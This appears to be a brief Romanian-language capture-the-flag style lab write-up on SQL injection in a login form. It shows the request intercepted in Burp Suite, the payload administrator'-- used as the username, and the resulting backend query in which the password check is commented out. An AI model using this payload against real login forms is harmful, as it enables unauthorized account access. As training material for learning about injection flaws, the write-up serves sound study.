
---
# Problema:
Acest laborator contine o vulnerabilitate de SQLi la functia de login.

Pentru a rezolva, trebuie sa facem un SQLi pentru a ne conecta la aplicatie ca administrator 

---
# Rezolvare:
![Pasted image 20260922181213](../../Pasted%20image%2020260922181213.png)
![Pasted image 20260922181227](../../Pasted%20image%2020260922181227.png)
Pentru inceput, am dat Log In de pe site si am interceptat pe Burpsuite.
Din cate se poate observa, login ul cu username ul si parola sunt in partea de jos a pozei:

``csrf=9u3gZ8uwFBMX3jCRT4xaxP4Vu86OhgVN&username=administrator&password=password``

Astfel, primul instinct ar fi sa incercam sa comentam partea de parola, incercand sa ne logam cu username-ul ``administrator--``
![Pasted image 20260922181835](../../Pasted%20image%2020260922181835.png)
![Pasted image 20260922181906](../../Pasted%20image%2020260922181906.png)

---
# Cum functioneaza:
---

Cum gandeste backend-ul:
SELECT * FROM users WHERE username = 'administrator' AND password = 'password'

Astfel, folosind ``administrator'--``, in backend va ajunge:
``SELECT * FROM users WHERE username = 'administrator'--' AND password = 'password'``

Asadar, va ramane la login doar username-ul dorit: administrator, iar partea de parola va fi comentata, deci ignorata.

---
